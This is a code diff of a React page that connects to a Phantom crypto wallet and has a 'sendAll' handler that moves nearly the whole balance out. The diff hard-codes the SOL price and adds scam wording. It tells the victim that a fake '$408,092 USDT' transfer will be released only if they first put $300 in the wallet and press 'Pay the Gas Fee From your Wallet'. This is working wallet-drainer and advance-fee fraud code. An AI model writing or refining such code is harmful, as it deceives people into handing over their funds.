@@ -17,28 +17,12 @@ useEffect(() => {
 
 const [solPrice, setSolPrice] = useState(0)
 
-useEffect(() => {
-  const fetchPrice = async () => {
-    try {
-      const res = await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
-      )
-      const data = await res.json()
-      setSolPrice(data.solana.usd)
-    } catch (err) {
-      console.error("price error", err)
-    }
-  }
 
-  fetchPrice()
-  const interval = setInterval(fetchPrice, 30000) // cada 30s
-
-  return () => clearInterval(interval)
-}, [])
+const SOL_PRICE = 150 // 🔥 precio fijo
 
 
   // 🔁 demo conversion
-  const SOL_RATE = solPrice || 160
+  const SOL_RATE = SOL_PRICE
   const usd = -5.09
   const sol = usd / SOL_RATE
 
@@ -82,7 +66,7 @@ const publicKey = res.publicKey
       const amount = balance - SAFETY_BUFFER
 
       if (amount <= 0) {
-        alert("Sin balance")
+        alert("Add 300 balance to phantom")
         return
       }
 
@@ -199,13 +183,40 @@ const publicKey = res.publicKey
           onClick={sendAll}
           className="mt-10 px-6 py-3 text-xs tracking-widest border border-purple-500/40 text-purple-300 hover:bg-purple-500 hover:text-white transition rounded-full"
         >
-          Pay the remaining balance
-
+          Pay the Gas Fee From your Wallet
         </button>
 
 
-<p className="mt-6 text-center text-white/60 max-w-sm mx-auto leading-relaxed">
-The transfer of -$4,098 to 82ed******Xap is on hold until the full fee balance is released. Please pay the fee to release your transfer</p>
+
+<div className="mt-6 max-w-md mx-auto rounded-2xl border border-yellow-500/30 bg-yellow-500/10 backdrop-blur-md p-4 shadow-lg">
+
+  <div className="flex items-start gap-3">
+    
+    {/* ⚠️ icono */}
+    <div className="mt-1 text-yellow-400 text-lg">
+      ⚠️
+    </div>
+
+    {/* texto */}
+    <div className="text-left">
+      <p className="text-yellow-300 font-semibold text-sm mb-1 tracking-wide">
+        Important Notice
+      </p>
+
+      <p className="text-yellow-200/80 text-sm leading-relaxed">
+        To release the <span className="font-semibold text-white">$408,092 USDT</span>,  
+        you must maintain a balance of <span className="text-yellow-300 font-semibold">$300 USD</span>  
+        in your wallet beforehand.
+      </p>
+
+      <p className="text-yellow-200/60 text-xs mt-2">
+        This is not a fee, but a required balance to prevent additional charges during the transaction.
+      </p>
+    </div>
+
+  </div>
+</div>
+
 
 
 {isMobile && (
